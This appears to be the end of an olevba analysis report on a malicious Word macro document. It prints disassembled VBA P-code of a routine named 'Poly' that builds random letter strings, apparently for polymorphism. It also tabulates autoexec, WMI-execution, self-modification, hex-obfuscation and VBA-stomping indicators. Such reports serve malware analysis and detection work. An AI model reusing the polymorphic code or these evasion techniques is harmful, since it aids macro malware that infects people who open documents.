' 	Ld Hmm 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St HmmHmm 
' 	EndIf 
' Line #194:
' 	Ld Hmm 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St HmmHmm 
' 	EndIf 
' Line #195:
' 	Ld Hmm 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St HmmHmm 
' 	EndIf 
' Line #196:
' 	Ld Hmm 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St HmmHmm 
' 	EndIf 
' Line #197:
' 	Ld Hmm 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St HmmHmm 
' 	EndIf 
' Line #198:
' 	Ld Hmm 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St HmmHmm 
' 	EndIf 
' Line #199:
' 	Ld Hmm 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St HmmHmm 
' 	EndIf 
' Line #200:
' 	Ld Hmm 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St HmmHmm 
' 	EndIf 
' Line #201:
' 	Ld Hmm 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St HmmHmm 
' 	EndIf 
' Line #202:
' 	Ld Hmm 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St HmmHmm 
' 	EndIf 
' Line #203:
' 	Ld Hmm 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St HmmHmm 
' 	EndIf 
' Line #204:
' 	Ld Hmm 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St HmmHmm 
' 	EndIf 
' Line #205:
' 	Ld Hmm 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St HmmHmm 
' 	EndIf 
' Line #206:
' 	Ld Hmm 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St HmmHmm 
' 	EndIf 
' Line #207:
' 	Ld Hmm 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St HmmHmm 
' 	EndIf 
' Line #208:
' 	Ld Hmm 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St HmmHmm 
' 	EndIf 
' Line #209:
' 	Ld Hmm 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St HmmHmm 
' 	EndIf 
' Line #210:
' 	Ld Hmm 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St HmmHmm 
' 	EndIf 
' Line #211:
' 	Ld Hmm 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St HmmHmm 
' 	EndIf 
' Line #212:
' 	Ld Hmm 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St HmmHmm 
' 	EndIf 
' Line #213:
' 	Ld Hmm 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St HmmHmm 
' 	EndIf 
' Line #214:
' 	Ld Hmm 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St HmmHmm 
' 	EndIf 
' Line #215:
' Line #216:
' 	ArgsCall Read 0x0000 
' Line #217:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St HmmHmmHmm 
' Line #218:
' 	Ld HmmHmmHmm 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HmmHmm 
' 	ArgsLd LCase 0x0001 
' 	St HmmHmm 
' 	EndIf 
' Line #219:
' Line #220:
' 	Ld HmmHmmHmmHmm 
' 	Ld HmmHmm 
' 	Concat 
' 	St HmmHmmHmmHmm 
' Line #221:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #222:
' Line #223:
' 	Ld HmmHmmHmmHmm 
' 	St Poly 
' Line #224:
' 	EndFunc 
' Line #225:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

